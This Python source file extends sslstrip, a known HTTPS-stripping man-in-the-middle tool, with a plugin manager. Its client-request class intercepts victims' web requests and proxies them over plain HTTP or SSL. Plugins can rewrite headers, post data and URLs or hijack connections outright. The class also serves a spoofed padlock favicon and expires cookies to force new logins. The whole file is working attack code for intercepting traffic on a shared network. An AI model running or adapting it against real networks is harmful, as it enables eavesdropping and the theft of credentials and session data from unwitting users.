# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from sslstrip.ServerConnectionFactory import ServerConnectionFactory
from sslstrip.ServerConnection import ServerConnection
from sslstrip.SSLServerConnection import SSLServerConnection
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner
from sslstrip.DnsCache import DnsCache
from sslstrip.ClientRequest import ClientRequest
from s1plugin.S1PluginManager import S1PluginManager
from s1plugin.S1ServerConnection import S1ServerConnection
from s1plugin.S1SSLServerConnection import S1SSLServerConnection

#static plugin manager
gpmgr=S1PluginManager()

class S1ClientRequest(ClientRequest):

    ''' This class is a slightly changed version of the original
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        ClientRequest.__init__(self, channel, queued, reactor)
        self.pmgr=gpmgr
        S1ServerConnection.pmgr=gpmgr

    def cleanHeaders(self):
        headers=ClientRequest.cleanHeaders(self)
        headers=self.pmgr.onCleanHeaders(self.getClientIP(),self.getAllHeaders().copy(),headers)
        return headers

    def handleHostResolvedSuccess(self, address):
        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path

        host,headers,client,path,postData,url=self.pmgr.onClientConnection(host,headers,client,path,postData,url)

        self.dnsCache.cacheResolution(host, address)

        if (self.pmgr.hijackConnection(self.getClientIP(),url,self)):
            logging.debug("Connection hijacked...")
        elif (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            logging.debug("Sending expired cookies...")
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                    host, headers, path))
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            logging.debug("Sending spoofed favicon response...")
            ico=self.pmgr.onSendSpoofedFaviconResponse(self.getClientIP(),self.getPathToLockIcon())
            self.sendSpoofedFaviconResponse(ico)
        elif (self.urlMonitor.isSecureLink(client, url)):
            logging.debug("Sending request via SSL...")
            self.proxyViaSSL(address, self.method, path, postData, headers,
                             self.urlMonitor.getSecurePort(client, url))
        else:
            logging.debug("Sending request via HTTP...")
            self.proxyViaHTTP(address, self.method, path, postData, headers)

    def handleHostResolvedError(self, error):
        self.pmgr.onHostResolvedError(self.getClientIP(),error)
        ClientRequest.handleHostResolvedError(self,error)

    def resolveHost(self, host):
        result=ClientRequest.resolveHost(self,host)
        return self.pmgr.onResolveHost(self.getClientIP(),host,result)

    def process(self):
        logging.debug("Resolving host: %s" % (self.getHeader('host')))
        host     = self.getHeader('host')               
        deferred = self.resolveHost(host)

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers):
        port=80
        host, method, path, postData, headers, port=self.pmgr.onProxy(self.getClientIP(),host, method, path, postData, headers, port, False)
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = S1ServerConnection
        self.reactor.connectTCP(host, port, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        host, method, path, postData, headers, port=self.pmgr.onProxy(self.getClientIP(),host, method, path, postData, headers, port, True)
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = S1SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
        
    def sendSpoofedFaviconResponse(self,ico):
        icoFile = open(ico)

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()
